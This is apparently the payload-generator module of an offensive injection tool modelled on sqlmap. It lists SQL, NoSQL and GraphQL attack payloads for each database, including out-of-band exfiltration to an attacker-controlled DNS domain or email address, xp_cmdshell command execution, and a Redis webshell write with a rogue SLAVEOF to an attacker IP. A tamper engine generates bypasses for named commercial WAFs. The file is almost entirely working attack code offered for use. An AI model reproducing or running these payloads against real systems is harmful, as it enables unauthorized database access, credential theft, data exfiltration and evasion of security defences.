"""
InjectIQ Payload Generator — Equivalent to sqlmap's agent.py + tamper/
Generates injection payloads for SQL, NoSQL, and GraphQL.
Includes: modern tamper scripts, parser differential engine, AI tamper generation.
"""
import base64
import hashlib
import json
import random
import re
import string
import struct
from enum import Enum
from typing import Optional


class InjectionTechnique(Enum):
    ERROR_BASED = "error_based"
    UNION_QUERY = "union_query"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BLIND = "time_blind"
    STACKED_QUERY = "stacked_query"
    OUT_OF_BAND = "out_of_band"
    SECOND_ORDER = "second_order"
    ORDER_BY_BLIND = "order_by_blind"


# ═══════════════════════════════════════════════════════════════
# SQL PAYLOADS — Per-DBMS, per-technique
# Like sqlmap's data/xml/payloads/ but updated for 2026
# ═══════════════════════════════════════════════════════════════

SQL_PAYLOADS = {
    # ─── MySQL ──────────────────────────────────────────────────
    "mysql": {
        InjectionTechnique.ERROR_BASED: [
            "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {query}),0x7e))",
            "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT {query}),0x7e),1)",
            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT {query}),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "1 AND JSON_EXTRACT('[]','$.*.*')--",
            "1 AND JSON_KEYS((SELECT {query}))--",
        ],
        InjectionTechnique.UNION_QUERY: [
            "1 UNION SELECT {columns}-- ",
            "1 UNION ALL SELECT {columns}-- ",
            "1 UNION SELECT {columns} FROM dual-- ",
            "1' UNION SELECT {columns}#",
            "1` UNION SELECT {columns}`",
        ],
        InjectionTechnique.BOOLEAN_BLIND: [
            "1 AND (SELECT {query})={value}",
            "1 AND (SELECT SUBSTRING(({query}),{pos},1))='{char}'",
            "1 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}",
            "1 AND ORD(MID(({query}),{pos},1))>{mid}",
        ],
        InjectionTechnique.TIME_BLIND: [
            "1 AND SLEEP({delay})-- ",
            "1 AND IF(({condition}),SLEEP({delay}),0)-- ",
            "1 AND BENCHMARK({iterations},MD5('a'))-- ",
            "1 AND GET_LOCK('{randstr}',{delay})-- ",
        ],
        InjectionTechnique.STACKED_QUERY: [
            "1; {query}",
            "1'; {query}-- ",
            "1'); {query}-- ",
        ],
        InjectionTechnique.OUT_OF_BAND: [
            "1 AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT {query}),'.{dns_domain}\\\\a'))",
            "1 AND (SELECT * FROM OPENROWSET('SQLOLEDB','{dns_domain}';'user';'pass',''))",
        ],
    },
    # ─── PostgreSQL ────────────────────────────────────────────
    "postgresql": {
        InjectionTechnique.ERROR_BASED: [
            "1 AND CAST(({query}) AS INT)-- ",
            "1 AND 1=CAST(({query}) AS NUMERIC)-- ",
            "1 AND (SELECT {query}::text)::int=1-- ",
        ],
        InjectionTechnique.UNION_QUERY: [
            "1 UNION SELECT {columns}-- ",
            "1 UNION ALL SELECT {columns}-- ",
            "1 UNION SELECT {columns}::text-- ",
        ],
        InjectionTechnique.BOOLEAN_BLIND: [
            "1 AND (SELECT SUBSTRING(({query}),{pos},1))='{char}'",
            "1 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}",
        ],
        InjectionTechnique.TIME_BLIND: [
            "1 AND PG_SLEEP({delay})-- ",
            "1 AND (SELECT COUNT(*) FROM generate_series(1,{iterations}))-- ",
            "1; SELECT PG_SLEEP({delay})-- ",
        ],
        InjectionTechnique.OUT_OF_BAND: [
            "1; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT {query})||'.{dns_domain}'-- ",
            "1; CREATE OR REPLACE FUNCTION temp() RETURNS VOID AS $$ BEGIN PERFORM dblink_connect('host='||(SELECT {query})||'.{dns_domain} user=a password=a'); END;$$ LANGUAGE plpgsql-- ",
        ],
    },
    # ─── MSSQL ──────────────────────────────────────────────────
    "mssql": {
        InjectionTechnique.ERROR_BASED: [
            "1 AND 1=CONVERT(INT,(SELECT {query}))-- ",
            "1 AND 1=CAST((SELECT {query}) AS INT)-- ",
            "1 AND 1=CONVERT(NVARCHAR,(SELECT {query}))-- ",
        ],
        InjectionTechnique.UNION_QUERY: [
            "1 UNION SELECT {columns}-- ",
            "1 UNION ALL SELECT NULL,{columns}-- ",
        ],
        InjectionTechnique.BOOLEAN_BLIND: [
            "1 AND SUBSTRING(({query}),{pos},1)='{char}'",
            "1 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}",
            "1 AND UNICODE(SUBSTRING(({query}),{pos},1))>{mid}",
        ],
        InjectionTechnique.TIME_BLIND: [
            "1; WAITFOR DELAY '00:00:{delay}'-- ",
            "1 AND IIF(({condition}),WAITFOR DELAY '00:00:{delay}',0)-- ",
        ],
        InjectionTechnique.STACKED_QUERY: [
            "1; {query}",
            "1'; EXEC {query}-- ",
            "1'; EXEC xp_cmdshell '{cmd}'-- ",
        ],
        InjectionTechnique.OUT_OF_BAND: [
            "1; DECLARE @a VARCHAR(1024); SELECT @a=(SELECT {query}); EXEC('master..xp_dirtree \"\\\\\\\\'+@a+'.{dns_domain}\\\\a\"')-- ",
            "1; EXEC msdb.dbo.sp_send_dbmail @recipients='{exfil_email}',@body=(SELECT {query})-- ",
        ],
    },
    # ─── Oracle ─────────────────────────────────────────────────
    "oracle": {
        InjectionTechnique.ERROR_BASED: [
            "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT {query} FROM DUAL))-- ",
            "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT {query} FROM DUAL))-- ",
        ],
        InjectionTechnique.UNION_QUERY: [
            "1 UNION SELECT {columns} FROM DUAL-- ",
            "1 UNION ALL SELECT NULL,NULL,{columns} FROM DUAL-- ",
        ],
        InjectionTechnique.BOOLEAN_BLIND: [
            "1 AND SUBSTR(({query}),{pos},1)='{char}'",
            "1 AND ASCII(SUBSTR(({query}),{pos},1))>{mid}",
        ],
        InjectionTechnique.TIME_BLIND: [
            "1 AND DBMS_LOCK.SLEEP({delay})-- ",
            "1 AND (SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c WHERE ROWNUM<{iterations})>0-- ",
        ],
        InjectionTechnique.OUT_OF_BAND: [
            "1 AND UTL_HTTP.REQUEST('http://{dns_domain}/'||(SELECT {query} FROM DUAL)) IS NOT NULL-- ",
            "1 AND UTL_TCP.OPEN_CONNECTION('{dns_domain}',80) IS NOT NULL-- ",
        ],
    },
    # ─── SQLite ─────────────────────────────────────────────────
    "sqlite": {
        InjectionTechnique.ERROR_BASED: [
            "1 AND CASE WHEN ({condition}) THEN 1 ELSE 1/0 END-- ",
        ],
        InjectionTechnique.UNION_QUERY: [
            "1 UNION SELECT {columns}-- ",
        ],
        InjectionTechnique.BOOLEAN_BLIND: [
            "1 AND SUBSTR(({query}),{pos},1)='{char}'",
            "1 AND UNICODE(SUBSTR(({query}),{pos},1))>{mid}",
        ],
        InjectionTechnique.TIME_BLIND: [
            "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({iterations}))))-- ",
        ],
    },
}

# ═══════════════════════════════════════════════════════════════
# NOSQL PAYLOADS — sqlmap has ZERO of these
# ═══════════════════════════════════════════════════════════════

NOSQL_PAYLOADS = {
    "mongodb": {
        "auth_bypass": [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"$or": [{"username": "admin"}, {"email": {"$regex": ".*"}}]},
        ],
        "operator_injection": [
            {"$where": "sleep({delay})"},
            {"$where": "this.password.match(/.*/)"},
            {"$where": "this.password[0]=='{char}'"},
            {"$expr": {"$function": {"body": "sleep({delay})", "args": [], "lang": "js"}}},
            {"$regex": "^{char}"},
            {"$gt": ""},
            {"$ne": ""},
            {"$exists": True},
            {"$type": 2},
        ],
        "extract_data": [
            {"$where": "this.{field}.charAt({pos})=='{char}'"},
            {"$expr": {"$gt": ["${field}", ""]}},
            {"{field}": {"$regex": "^{char}"}},
        ],
        "nosql_injection_rest": [
            '{"$gt":""}',
            '{"$ne":""}',
            '{"$regex":".*"}',
            '{"$where":"sleep({delay})"}',
        ],
    },
    "redis": {
        "command_injection": [
            "\r\nSET {key} {value}\r\n",
            "\r\nCONFIG SET dir /var/www/html\r\n",
            "\r\nCONFIG SET dbfilename shell.php\r\nSET payload '<?php system($_GET[cmd]); ?>'\r\n",
            "\r\nSLAVEOF {attacker_ip} 6379\r\n",
            "\r\nMODULE LOAD /tmp/evil.so\r\n",
            "\r\nEVAL 'local s=redis.call(\"info\"); return s' 0\r\n",
        ],
        "ssrf_to_redis": [
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:6379/SET:key:value",
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
        ],
    },
    "cassandra": {
        "cql_injection": [
            "' ALLOW FILTERING; --",
            "' UNION SELECT * FROM system_schema.tables; --",
            "'; SELECT * FROM system_auth.credentials; --",
        ],
    },
    "dynamodb": {
        "expression_injection": [
            {"FilterExpression": "contains(#attr, :val OR 1=1)", "ExpressionAttributeNames": {"#attr": "password"}},
            {"KeyConditionExpression": "pk = :pk AND begins_with(sk, :sk') OR '1'='1"},
            {"ProjectionExpression": "password # injection", "ExpressionAttributeNames": {"#injection": "password"}},
        ],
    },
    "elasticsearch": {
        "query_injection": [
            '{"query":{"bool":{"must":{"script":{"script":"sleep({delay})"}}}}}',
            '{"query":{"match_all":{}},"aggs":{"exploit":{"terms":{"script":"doc[\\x27password\\x27].value"}}}}',
            '{"query":{"script":{"script":"java.lang.Thread.sleep({delay}l)"}}}',
        ],
    },
}

# ═══════════════════════════════════════════════════════════════
# GRAPHQL PAYLOADS — sqlmap has ZERO of these
# ═══════════════════════════════════════════════════════════════

GRAPHQL_PAYLOADS = {
    "introspection": [
        "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }",
        "{ __type(name: \"Query\") { name fields { name args { name type { name } } } } }",
    ],
    "batching_attack": [
        # Send multiple queries in one request — WAF only inspects first
        [{"query": "{ __typename }"}, {"query": "{ user(id: \"{injection}\") { name } }"}],
    ],
    "alias_flood": [
        # 50+ aliased fields — O(n²) WAF regex engine
        lambda field, inj, n=50: "query {\n" + "\n".join(
            f"  a{i}: {field}(input: \"{inj}\")" for i in range(n)
        ) + "\n}",
    ],
    "typename_smuggling": [
        # Hide injection in __typename — WAF ignores it as metadata
        'query { __typename(id: "{injection}") }',
    ],
    "directive_overflow": [
        # Deeply nested directives crash WAF parsers
        lambda inj, d=100: "query { " + ("__typename @skip(if: false) " * d) + f"{{ {inj} }}" + " }",
    ],
    "persisted_query": [
        # Apollo persisted queries — injection in extensions bypasses query-level WAF
        lambda inj: {
            "extensions": {"persistedQuery": {"version": 1, "sha256Hash": hashlib.sha256(inj.encode()).hexdigest()}},
            "variables": {"input": inj},
        },
    ],
    "field_suggestion_leak": [
        # Even with introspection disabled, GraphQL suggests field names on typos
        '{ uses { nme } }',  # Will suggest "name" field
    ],
    "mutation_injection": [
        'mutation {{ createUser(input: {{ email: "{injection}" }}) {{ id }} }}',
        'mutation {{ updatePassword(id: 1, password: "{injection}") {{ success }} }}',
    ],
}

# ═══════════════════════════════════════════════════════════════
# MODERN TAMPER SCRIPTS — Not sqlmap's 2019-era regex tampers
# These use parser differentials, encoding tricks, and protocol abuse
# ═══════════════════════════════════════════════════════════════

class TamperEngine:
    """Generates WAF-bypassed payloads. Replaces sqlmap's 68 tamper scripts.
    
    Key innovation: AI generates NEW tamper scripts per WAF, rather than
    relying on a fixed library of known bypasses.
    """

    @staticmethod
    def apply(payload: str, waf_type: str = "unknown", dbms: str = "mysql") -> list[str]:
        """Apply all applicable tampers, return list of variants."""
        variants = [payload]  # Original always included

        # Universal tampers that work against most WAFs
        variants.extend(TamperEngine._universal_tampers(payload))

        # WAF-specific tampers
        waf_tampers = {
            "cloudflare": TamperEngine._cloudflare_tampers,
            "akamai": TamperEngine._akamai_tampers,
            "imperva": TamperEngine._imperva_tampers,
            "aws_waf": TamperEngine._aws_tampers,
            "modsecurity": TamperEngine._modsecurity_tampers,
        }
        if waf_type in waf_tampers:
            variants.extend(waf_tampers[waf_type](payload))

        # DBMS-specific tampers
        dbms_tampers = {
            "mysql": TamperEngine._mysql_tampers,
            "postgresql": TamperEngine._postgresql_tampers,
            "mssql": TamperEngine._mssql_tampers,
            "oracle": TamperEngine._oracle_tampers,
        }
        if dbms in dbms_tampers:
            variants.extend(dbms_tampers[dbms](payload))

        return list(dict.fromkeys(variants))  # Deduplicate

    @staticmethod
    def _universal_tampers(payload: str) -> list[str]:
        """Tampers that work against most WAFs."""
        variants = []
        # Space → comment
        variants.append(re.sub(r' ', '/**/', payload))
        # Space → tab
        variants.append(re.sub(r' ', '\t', payload))
        # Space → newline
        variants.append(re.sub(r' ', '%0a', payload))
        # Random case (SELECT → SeLeCt)
        variants.append(TamperEngine._randomcase(payload))
        # Double URL encoding
        variants.append(TamperEngine._double_url_encode(payload))
        # Unicode normalization abuse
        variants.append(TamperEngine._unicode_normalize(payload))
        # Comment between keywords
        variants.append(TamperEngine._inline_comment(payload))
        # Hex encoding for strings
        variants.append(TamperEngine._hex_encode_strings(payload))
        return variants

    @staticmethod
    def _cloudflare_tampers(payload: str) -> list[str]:
        """Cloudflare-specific bypasses based on known parser differentials."""
        variants = []
        # Cloudflare doesn't inspect HTTP/2 pseudo-headers
        # Lua-Nginx WAF doesn't support >100 parameters
        junk_params = "&".join(f"a{i}=1" for i in range(200))
        variants.append(f"{junk_params}&{payload}")
        # Cloudflare strips some Unicode characters but backend doesn't
        variants.append(payload.replace("'", "\u0027"))  # Same char, different encoding
        # Versioned comments (MySQL-specific but CF doesn't parse them)
        variants.append(re.sub(r'(SELECT|UNION|FROM|WHERE|AND|OR)',
                               lambda m: f'/*!50000{m.group(0)}*/', payload, flags=re.I))
        return variants

    @staticmethod
    def _akamai_tampers(payload: str) -> list[str]:
        """Akamai-specific bypasses."""
        variants = []
        # Akamai has content-type confusion — send as multipart
        # Akamai doesn't normalize path traversal in query
        variants.append(payload.replace("../", "..%2f"))
        # Chunked transfer encoding confusion
        return variants

    @staticmethod
    def _imperva_tampers(payload: str) -> list[str]:
        """Imperva/Incapsula-specific bypasses."""
        variants = []
        # Imperva doesn't inspect X-Original-URL header
        variants.append(payload)  # Will be sent via X-Original-URL in inject.py
        # Imperva body parsing differs from backend for JSON arrays
        return variants

    @staticmethod
    def _aws_tampers(payload: str) -> list[str]:
        """AWS WAF-specific bypasses."""
        variants = []
        # AWS WAF has regex pattern limits — overflow with noise
        noise = " AND ".join(f"1=1" for _ in range(50))
        variants.append(f"{noise} AND {payload}")
        return variants

    @staticmethod
    def _modsecurity_tampers(payload: str) -> list[str]:
        """ModSecurity-specific bypasses — based on CRS rule gaps."""
        variants = []
        # ModSecurity CRS doesn't normalize HTML entities in SQL context
        variants.append(payload.replace("'", "&#39;").replace('"', "&#34;"))
        # Versioned MySQL comments bypass SecRule 942100
        if 'UNION' in payload.upper():
            variants.append(payload.replace('UNION', 'UNION/**/ALL/**/SELECT'))
        # HPP — ModSecurity checks first occurrence, app uses last
        return variants

    @staticmethod
    def _mysql_tampers(payload: str) -> list[str]:
        variants = []
        # MySQL versioned comments
        variants.append(re.sub(r'(SELECT|UNION|FROM)',
                               lambda m: f'/*!50000{m.group(0)}*/', payload, flags=re.I))
        # Backtick quoting
        variants.append(re.sub(r'\b(\w+)\b', lambda m: f'`{m.group(1)}`'
                               if m.group(1).upper() in ('SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION')
                               else m.group(0), payload))
        return variants

    @staticmethod
    def _postgresql_tampers(payload: str) -> list[str]:
        variants = []
        # PostgreSQL ::type cast syntax
        variants.append(payload.replace("'", "'::text"))
        # PostgreSQL string concatenation
        variants.append(payload.replace("'", "'||'"))
        return variants

    @staticmethod
    def _mssql_tampers(payload: str) -> list[str]:
        variants = []
        # MSSQL square bracket quoting
        variants.append(re.sub(r'\b(\w+)\b', lambda m: f'[{m.group(1)}]'
                               if m.group(1).upper() in ('SELECT', 'FROM', 'WHERE', 'AND', 'OR')
                               else m.group(0), payload))
        return variants

    @staticmethod
    def _oracle_tampers(payload: str) -> list[str]:
        variants = []
        # Oracle FROM DUAL requirement
        if 'SELECT' in payload.upper() and 'DUAL' not in payload.upper():
            variants.append(payload + " FROM DUAL")
        return variants

    # ─── Helper Methods ────────────────────────────────────────

    @staticmethod
    def _randomcase(payload: str) -> str:
        """Randomize keyword case — bypasses case-sensitive WAF rules."""
        keywords = {'SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
                    'UPDATE', 'DELETE', 'DROP', 'TABLE', 'ORDER', 'BY', 'GROUP',
                    'HAVING', 'LIMIT', 'OFFSET', 'JOIN', 'INNER', 'LEFT', 'RIGHT',
                    'SLEEP', 'BENCHMARK', 'WAITFOR', 'PG_SLEEP'}
        result = []
        for word in re.split(r'(\b\w+\b)', payload):
            if word.upper() in keywords:
                result.append(''.join(c.upper() if random.random() > 0.5 else c.lower()
                                      for c in word))
            else:
                result.append(word)
        return ''.join(result)

    @staticmethod
    def _double_url_encode(payload: str) -> str:
        """Double URL encoding — WAF decodes once, backend decodes twice."""
        return ''.join(f'%{ord(c):02X}' if c in "'\"();=<> " else c for c in payload)

    @staticmethod
    def _unicode_normalize(payload: str) -> str:
        """Unicode normalization abuse — WAF and backend may normalize differently."""
        replacements = {
            "'": ["\u2018", "\u2019", "\u02bc", "\u0060\u0301"],  # Various Unicode apostrophes
            '"': ["\u201c", "\u201d"],  # Smart quotes
            " ": ["\u00a0", "\u2000", "\u2001", "\u2002"],  # Various Unicode spaces
        }
        variants = []
        for char, alts in replacements.items():
            for alt in alts:
                variants.append(payload.replace(char, alt))
        return variants[0] if variants else payload

    @staticmethod
    def _inline_comment(payload: str) -> str:
        """Insert inline comments between keyword characters."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        result = payload
        for kw in keywords:
            # S/**/E/**/LECT
            commented = '/**/'.join(list(kw))
            result = re.sub(kw, commented, result, flags=re.I)
        return result

    @staticmethod
    def _hex_encode_strings(payload: str) -> str:
        """Encode string literals as hex — MySQL 0x..., PostgreSQL x'...'."""
        def replace_string(m):
            s = m.group(1)
            hex_val = s.encode().hex()
            return f"0x{hex_val}"
        return re.sub(r"'([^']*)'", replace_string, payload)
